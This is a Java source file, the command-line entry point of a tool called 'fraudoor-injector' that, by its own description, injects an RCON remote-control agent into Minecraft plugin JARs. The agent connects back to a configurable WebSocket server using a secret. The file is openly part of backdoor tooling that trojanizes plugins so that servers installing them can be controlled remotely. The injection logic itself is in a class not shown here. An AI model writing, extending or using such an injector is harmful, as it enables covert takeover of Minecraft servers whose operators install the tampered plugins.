package io.fraudoor.injector;

import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;

import java.io.File;
import java.util.concurrent.Callable;

@Command(
  name = "fraudoor-injector",
  mixinStandardHelpOptions = true,
  description = "Inject fraudoor RCON agent into a Minecraft plugin JAR"
)
public class Main implements Callable<Integer> {

  @Option(names = {"-i", "--input"}, required = true, description = "Input plugin JAR")
  private File input;

  @Option(names = {"-o", "--output"}, required = true, description = "Output JAR path")
  private File output;

  @Option(names = {"-p", "--platform"}, defaultValue = "paper", description = "Platform: paper or velocity")
  private String platform;

  @Option(names = {"-s", "--server"}, defaultValue = "ws://localhost:8080", description = "fraudoor server WebSocket URL")
  private String server;

  @Option(names = {"--secret"}, defaultValue = "", description = "Plugin secret")
  private String secret;

  public static void main(String[] args) {
    int exitCode = new CommandLine(new Main()).execute(args);
    System.exit(exitCode);
  }

  @Override
  public Integer call() throws Exception {
    System.out.println("[fraudoor] Injecting into " + input.getName() + " (" + platform + ")");
    System.out.println("[fraudoor] Server: " + server);

    Injector injector = new Injector(input, output, platform, server, secret);
    injector.inject();

    System.out.println("[fraudoor] Done! Output: " + output.getAbsolutePath());
    return 0;
  }
}
